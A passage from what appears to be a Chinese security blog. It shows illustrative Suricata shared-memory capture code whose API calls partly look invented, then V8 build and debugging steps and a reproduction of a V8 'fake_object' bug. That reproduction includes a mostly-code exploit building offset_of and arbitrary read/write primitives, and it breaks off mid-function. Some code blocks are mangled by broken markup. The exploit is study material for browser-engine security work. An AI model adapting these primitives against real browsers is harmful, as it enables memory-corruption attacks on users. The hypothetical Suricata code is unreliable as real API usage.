operator">*</span>th_v<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>thread_data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>       <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f <span class="token operator">=</span> <span class="token function">FlowDequeue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_recycle_q<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">FLOWLOCK_WRLOCK</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token function">OutputFlowLog</span><span class="token punctuation">(</span>th_v<span class="token punctuation">,</span> ftd<span class="token operator">-></span>output_thread_data<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">FlowClearMemory</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>protomap<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">FLOWLOCK_UNLOCK</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">FlowMoveToSpare</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>                recycled_cnt<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>进程退出</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FlowShutdown</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>f <span class="token operator">=</span> <span class="token function">FlowDequeue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_recycle_q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">FlowFree</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="实现-Suricata-从共享内存中读取流量数据的-demo"><a href="#实现-Suricata-从共享内存中读取流量数据的-demo" class="headerlink" title="实现 Suricata 从共享内存中读取流量数据的 demo"></a>实现 Suricata 从共享内存中读取流量数据的 demo</h2><h3 id="添加新抓包驱动"><a href="#添加新抓包驱动" class="headerlink" title="添加新抓包驱动"></a>添加新抓包驱动</h3><ol><li><p>  首先，需要在 Suricata 源代码中添加一个新的抓包驱动。找到 <code>source-af-packet.c</code> 或其他现有抓包驱动文件，作为新驱动实现的模板。</p></li><li><p>文件 <code>source-sharedmem.c</code></p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"suricata-common.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"source.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"decode.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"util-sharedmem.h"</span>  <span class="token comment">// 假设我们有一个处理共享内存的工具</span></span><span class="token comment">// 定义抓包驱动的初始化函数</span><span class="token keyword">int</span> <span class="token function">SharedMemInit</span><span class="token punctuation">(</span>ConfNode <span class="token operator">*</span>conf<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>device<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 初始化共享内存</span>    <span class="token operator">*</span>data <span class="token operator">=</span> <span class="token function">SharedMemAttach</span><span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>data <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义抓包驱动的关闭函数</span><span class="token keyword">void</span> <span class="token function">SharedMemClose</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 关闭共享内存</span>    <span class="token function">SharedMemDetach</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义抓包驱动的读取函数</span><span class="token keyword">int</span> <span class="token function">SharedMemRead</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> Packet <span class="token operator">*</span>p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 从共享内存中读取数据</span>    <span class="token keyword">return</span> <span class="token function">SharedMemFetch</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 定义抓包驱动的配置结构</span>CaptureInterface shared_mem_iface <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"sharedmem"</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span>Init <span class="token operator">=</span> SharedMemInit<span class="token punctuation">,</span>    <span class="token punctuation">.</span>Close <span class="token operator">=</span> SharedMemClose<span class="token punctuation">,</span>    <span class="token punctuation">.</span>Read <span class="token operator">=</span> SharedMemRead<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 在 Suricata 初始化时注册抓包驱动</span><span class="token keyword">void</span> <span class="token function">TmModuleSharedMemRegister</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">TmModuleRegisterCaptureInterface</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>shared_mem_iface<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="然后，在-tm-threads-c-文件中注册新的抓包驱动："><a href="#然后，在-tm-threads-c-文件中注册新的抓包驱动：" class="headerlink" title="然后，在 tm-threads.c 文件中注册新的抓包驱动："></a>然后，在 <code>tm-threads.c</code> 文件中注册新的抓包驱动：</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">TmModuleSharedMemRegister</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">TmThreadsRegisterAll</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// ... 其他抓包驱动注册</span>    <span class="token function">TmModuleSharedMemRegister</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加新的运行模式"><a href="#添加新的运行模式" class="headerlink" title="添加新的运行模式"></a>添加新的运行模式</h3><ol><li><p>找到 Suricata 源代码中的 <code>runmodes.c</code> 文件，并添加新的运行模式，例如 <code>sharedmem</code></p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"runmode-sharedmem.h"</span></span><span class="token keyword">void</span> <span class="token function">RunModeRegisterAll</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// ... 其他运行模式注册</span>    <span class="token function">RunModeRegister</span><span class="token punctuation">(</span><span class="token string">"sharedmem"</span><span class="token punctuation">,</span> RunModeSharedMemAutoFp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在 <code>runmode-sharedmem.c</code> 文件中实现新的运行模式：</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"suricata-common.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"threads.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"source.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"runmode.h"</span></span><span class="token keyword">void</span> <span class="token function">RunModeSharedMemAutoFp</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 配置线程和队列</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">InitAutoFp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 创建和启动线程</span>    <span class="token function">TmThreadSpawn</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>shared_mem_iface<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 处理线程队列</span>    <span class="token function">TmThreadsSlotScheduler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="修改-ThreadVars-数据结构"><a href="#修改-ThreadVars-数据结构" class="headerlink" title="修改 ThreadVars 数据结构"></a>修改 ThreadVars 数据结构</h3><ol><li><p>为新的运行模式创建对应的 <code>ThreadVars</code> 数据结构：</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">SharedMemThreadVars_</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 定义线程变量</span>    <span class="token keyword">void</span> <span class="token operator">*</span>shared_mem<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> SharedMemThreadVars<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在 <code>runmode-sharedmem.c</code> 文件中使用该数据结构：</p>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"runmode-sharedmem.h"</span></span><span class="token keyword">int</span> <span class="token function">InitAutoFp</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 初始化线程变量</span>    SharedMemThreadVars <span class="token operator">*</span>tv <span class="token operator">=</span> <span class="token function">SCMalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>SharedMemThreadVars<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tv <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 初始化共享内存</span>    tv<span class="token operator">-></span>shared_mem <span class="token operator">=</span> <span class="token function">SharedMemAttach</span><span class="token punctuation">(</span><span class="token string">"/path/to/shared_mem"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>tv<span class="token operator">-></span>shared_mem <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="实现从共享内存读取流量数据的-demo"><a href="#实现从共享内存读取流量数据的-demo" class="headerlink" title="实现从共享内存读取流量数据的 demo"></a>实现从共享内存读取流量数据的 demo</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"util-sharedmem.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 附加到共享内存</span>    <span class="token keyword">void</span> <span class="token operator">*</span>shared_mem <span class="token operator">=</span> <span class="token function">SharedMemAttach</span><span class="token punctuation">(</span><span class="token string">"/path/to/shared_mem"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>shared_mem <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Failed to attach shared memory\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 读取数据包</span>    Packet p<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">SharedMemFetch</span><span class="token punctuation">(</span>shared_mem<span class="token punctuation">,</span> <span class="token operator">&amp;</span>p<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 处理数据包</span>        <span class="token function">ProcessPacket</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 分离共享内存</span>    <span class="token function">SharedMemDetach</span><span class="token punctuation">(</span>shared_mem<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Pwn-浏览器内核V8"><a href="#Pwn-浏览器内核V8" class="headerlink" title="Pwn-浏览器内核V8"></a>Pwn-浏览器内核V8</h1><h2 id="V8环境搭建"><a href="#V8环境搭建" class="headerlink" title="V8环境搭建"></a>V8环境搭建</h2><h3 id="编译V8"><a href="#编译V8" class="headerlink" title="编译V8"></a>编译V8</h3><ol><li><p>  Ubuntu 18.04操作系统</p></li><li><p>下载用于Chromium开发的工具depot_tools，用于V8的编译</p>  <pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromium&#x2F;tools&#x2F;depot_tools.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>将 <code>depot_tools</code> 添加到环境变量 <code>PATH</code> 的末尾</p>  <pre class="line-numbers language-none"><code class="language-none">export PATH&#x3D;$PATH:&lt;path to depot_tools&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>挂好代理，进入到 <code>depot_tools</code> 。直接安装会 <code>ninja</code> 报错需要先将版本回退到 <code>138bff28</code>** 并且将 <code>DEPOT_TOOLS_UPDATE</code> 设为 0 。之后更新 <code>depot_tools</code> 。</p>  <pre class="line-numbers language-none"><code class="language-none">git reset --hard 138bff28export DEPOT_TOOLS_UPDATE&#x3D;0gclient<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713210430.png"></p></li><li><p>下载 <code>v8</code>，这个时间比较长，下载完后目录下会多一个 <code>v8</code> 文件夹。</p>  <pre class="line-numbers language-none"><code class="language-none">fetch v8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>首先安装浏览器然后再网址栏中输入 <code>chrome://version</code> 查看版本，例如：</p>  <pre class="line-numbers language-none"><code class="language-none">112.0.5615.87 (正式版本) （64 位） (cohort: Bypass)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  打开 github 的 <a href="https://github.com/chromium/chromium">chrome</a> 项目，搜索版本号并切换至相应版本。</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713210543.png"></p></li><li><p>  然后在项目根目录下的 <code>DEPS</code> 文件中查看 <code>V8</code> 版本：</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713210608.png"></p></li><li><p>  编译 <code>v8</code> ，这里选的 <code>release</code> 版本。<code>debug</code> 版本改为 <code>x64.debug</code> ，32 为版本将 <code>x64</code> 改为 <code>ia32</code> 。如果调试漏洞的话, 最好选择 <code>release</code> 版本 因为 <code>debug</code> 版本可能会有很多检查。</p></li><li><p>  另外如果出现路径错误需要切换到 <code>./tools/dev/</code> 路径再进行编译。不过这样编译最终生成的 <code>d8</code> 在 <code>tools/dev/out/x64.release</code> 目录下。</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713210728.png"></p></li><li><p>  编译生成的 <code>d8</code> 在 <code>./out/x64.release/d8</code> 中。</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713210752.png"></p></li></ol><h3 id="调试V8"><a href="#调试V8" class="headerlink" title="调试V8"></a>调试V8</h3><ol><li><p>在 <code>~/.gdbinit</code> 添加 <code>v8</code> 的调试插件：</p>  <pre class="line-numbers language-none"><code class="language-none">source&#96; &#96;&#x2F;path&#x2F;to&#x2F;v8&#x2F;tools&#x2F;gdbinitsource&#96; &#96;&#x2F;path&#x2F;to&#x2F;v8&#x2F;tools&#x2F;gdb-v8-support&#96;&#96;.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>常见参数：</p><ul><li>  <code>--allow-natives-syntax</code> 开启原生API (用的比较多)</li><li>  <code>--trace-turbo</code> 跟踪生成TurboFan IR</li><li>  <code>--print-bytecode</code> 打印生成的bytecode</li><li>  <code>--shell</code> 运行脚本后切入交互模式</li><li>  更多参数可以参考 <code>--help</code></li></ul></li><li><p>调试 js 脚本时可以采用如下命令：</p>  <pre class="line-numbers language-none"><code class="language-none">gdb .&#x2F;d8r --allow-natives-syntax --shell .&#x2F;exp.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="安装-turbolizer"><a href="#安装-turbolizer" class="headerlink" title="安装 turbolizer"></a>安装 turbolizer</h3><ol><li><p><code>turbolizer</code> 是一个可视化分析 JS 优化的工具，安装命令如下：</p>  <pre class="line-numbers language-none"><code class="language-none">sudo apt install npmcd &#x2F;path&#x2F;to&#x2F;v8&#x2F;tools&#x2F;turbolizersudo npm install n -gsudo n 16.20.0 # sudo n latestsudo npm isudo npm run-script build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  由于 Ubuntu18.04 默认的 <code>node</code> 版本过低，需要安装 <code>16.20.0</code> 版本</p></li><li><p>最后需要启动一个 web 服务器，根据需要 8000 可以换成其它端口</p>  <pre class="line-numbers language-none"><code class="language-none">python -m SimpleHTTPServer 8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>编写一个 js 脚本：<br>  <code>%OptimizeFunctionOnNextCall</code> 内置函数可以直接触发强行触发优化。</p>  <pre class="line-numbers language-none"><code class="language-none">function add(a, b) &#123;    return a + b;&#125; &#x2F;&#x2F;%OptimizeFunctionOnNextCall(add);for (let i &#x3D; 0; i &lt; 10000000; i++) &#123;    add(i, i + 1);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>运行 js 脚本并使用 <code>--trace-turbo</code> 参数</p>  <pre class="line-numbers language-none"><code class="language-none">.&#96;&#96;&#x2F;d8&#96; &#96;--trace-turbo --allow-natives-syntax .&#96;&#96;&#x2F;test&#96;&#96;.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>此时会生成如下文件：</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713211102.png"></p></li><li><p>在浏览器（<strong>最好使用 Chrome 浏览器，系统自带的火狐浏览器可能有问题。</strong>）中访问 <code>http://127.0.0.1:8000/path/to/v8/tools/turbolizer/</code>（注意，这里的路径是相对于 python 启动的 web 服务的路径的相对路径而不是绝对路径） ，然后在其中打开该文件就可以进行分析。</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713211122.png"></p></li></ol><h2 id="任意地址对象伪造漏洞复现"><a href="#任意地址对象伪造漏洞复现" class="headerlink" title="任意地址对象伪造漏洞复现"></a>任意地址对象伪造漏洞复现</h2><ol><li><p>  如果存在任意地址对象伪造漏洞（<code>fake_object</code> 原语），则我们可以在一个大的 <code>DoubleArray</code> 中伪造一个 <code>DoubleArray</code> 然后实现 <code>offset_of</code> ，<code>arbitrary_offset_read</code> ，<code>arbitrary_offset_write</code> 原语。首先我们先创建一个大的 <code>DoubleArray</code> 并在里面伪造一个 <code>DoubleArray</code> 。</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713212232.png"></p></li><li><p>这里需要注意的是：通过调试可知，我们只需要伪造 <code>map</code> 的前 16 字节即可。而 <code>map</code> 的前 16 字节基本是不变的。</p>  <pre class="line-numbers language-none"><code class="language-none">let spray_array &#x3D; new Array(0xf700).fill(1.1);let spray_array_data_offset &#x3D; 0x00202141n + 7n;  &#x2F;&#x2F; spray_array 的 element 中成员的起始地址let map_offset &#x3D; spray_array_data_offset + 0x1000n;  &#x2F;&#x2F; 伪造的 map 在沙箱中的偏移let fake_double_array_offset &#x3D; map_offset + 0x1000n;  &#x2F;&#x2F; 伪造的 fake_double_array 在沙箱中的偏移 &#x2F;&#x2F; 伪造 fake_double_array 的 map ，这里只需要伪造前 16 字节。spray_array[(map_offset - spray_array_data_offset) &#x2F; 8n] &#x3D; u2d(0x1a04040400002141n);spray_array[(map_offset - spray_array_data_offset) &#x2F; 8n + 1n] &#x3D; u2d(0xa0007ff1100083an); &#x2F;&#x2F; fake_double_array 的 map 指针指向伪造的 mapspray_array[(fake_double_array_offset - spray_array_data_offset) &#x2F; 8n] &#x3D; u2d(map_offset | 1n | (0x00002259n &lt;&lt; 32n)); &#x2F;&#x2F; 利用任意地址对象伪造漏洞（fake_object）泄露出 fake_double_arraylet fake_double_array &#x3D; trigger(fake_double_array_offset | 1n);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li><p>  <code>offset_of</code> 原语实现：我们只需要再申请一个大的 <code>ObjectArray</code>（我们称之为 <code>spray_object_array</code>）然后让伪造的 <code>DoubleArray</code> 的 <code>elements</code> 指针指向 <code>spray_object_array</code> 的 <code>elements</code>（<code>elements</code> 在沙箱内偏移固定）造成类型混淆。</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713212340.png"></p></li><li></li><li><pre><code>  let spray_object_array = ``new` `Array(0xf700).fill(&#123;&#125;);  let object_array_element_offset = 0x00282141n;  <pre class="line-numbers language-none"><code class="language-none">           <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>  function` `offset_of(object) &#123;    ``// 将 object 添加到 spray_object_array 的 elements 中    ``spray_object_array[0] = object;    ``// fake_double_array 的 elements 指针指向 spray_object_array 的 elements    ``spray_array[(fake_double_array_offset - spray_array_data_offset) / 8n + 1n] = u2d(object_array_element_offset | 1n | (0x00000002n &lt;&lt; 32n));    ``// 从 fake_double_array 读出 object 在沙箱中的偏移    ``return` `d2u(fake_double_array[0]) &amp; 0xFFFFFFFFn;  &#125;  <pre class="line-numbers language-none"><code class="language-none">8.   &#96;arbitrary_offset_read&#96; 和 &#96;arbitrary_offset_write&#96; 原语实现：直接通过 &#96;apray_array&#96; 修改 &#96;elements&#96; 然后读写 &#96;fake_double_array&#96; 实现。9.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20240713212409.png)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>  function arbitrary_offset_read(address) &#123;      spray_array[(fake_double_array_offset - spray_array_data_offset) / 8n + 1n] = u2d((address - 8n) | 1n | (0x00000002n &lt;&lt; 32n));      return d2u(fake_double_array[0]);  &#125;     function arbitrary_offset_write(address, value) &#123;      spray_array[(fake_double_array_offset - spray_array_data_offset) / 8n + 1n] = u2d((address - 8n) | 1n | (0x00000002n &lt;&lt; 32n));      fake_double_array[0] = u2d(value);  <pre class="line-numbers language-none"><code class="language-none">10.   完整exp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>   let array_buffer = new ArrayBuffer(0x8);   let data_view = new DataView(array_buffer);       function d2u(value) &#123;       data_view.setFloat64(0, value);       return data_view.getBigUint64(0);   &#125;       function u2d(value) &#123;       data_view.setBigUint64(0, value);       return data_view.getFloat64(0);   &#125;       function hex(val) &#123;       return &#39;0x&#39; + val.toString(16).padStart(16, &quot;0&quot;);   &#125;       let oob_array = [.1];   let object_array = [&#123;&#125;];   let double_array = [.1];   let rw_array = [.1];           oob_array.len(0x1337);       let object_array_map = d2u(oob_array[8]);   let double_array_map = d2u(oob_array[12]);       console.log(&quot;[*] object array map: &quot; + hex(object_array_map &amp; 0xFFFFFFFFn));   console.log(&quot;[*] double array map: &quot; + hex(double_array_map &amp; 0xFFFFFFFFn));       function trigger(offset) &#123;       oob_array[12] = u2d(double_array_map);       double_array[0] = u2d(offset);       oob_array[12] = u2d((object_array_map &amp; 0xFFFFFFFFn) | (double_array_map &amp; 0xFFFFFFFF00000000n));       return double_array[0];   &#125;       let spray_array = new Array(0xf700).fill(1.1);   let spray_array_data_offset = 0x00202141n + 7n;   let map_offset = spray_array_data_offset + 0x1000n;   let fake_double_array_offset = map_offset + 0x1000n;       spray_array[(map_offset - spray_array_data_offset) / 8n] = u2d(0x1a04040400002141n);   spray_array[(map_offset - spray_array_data_offset) / 8n + 1n] = u2d(0xa0007ff1100083an);   spray_array[(fake_double_array_offset - spray_array_data_offset) / 8n] = u2d(map_offset | 1n | (0x00002259n &lt;&lt; 32n));;   let fake_double_array = trigger(fake_double_array_offset | 1n);           let spray_object_array = new Array(0xf700).fill(&#123;&#125;);   let object_array_element_offset = 0x00282141n;           function offset_of(object) &#123;       spray_object_array[0] = object;       spray_array[(fake_double_array_offset - spray_array_data_offset) / 8n + 1n] = u2d(object_array_element_offset | 1n | (0x00000002n &lt;&lt; 32n));       return d2u(fake_double_array[0]) &amp; 0xFFFFFFFFn;   &#125;       function arbitrary_offset_read(address) &#123;       spray_array[(fake_double_array_offset - spray_array_data_offset) / 8n + 1n] = u2d((address - 8n) | 1n | (0x00000002n &lt;&lt; 32n));       return d2u(fake_double_array[0]);   &#125;       function arbitrary_offset_write(address, value) &#123;       spray_array[(fake_double_array_offset - spray_array_data_offset) / 8n + 1n] = u2d((address - 8n) | 1n | 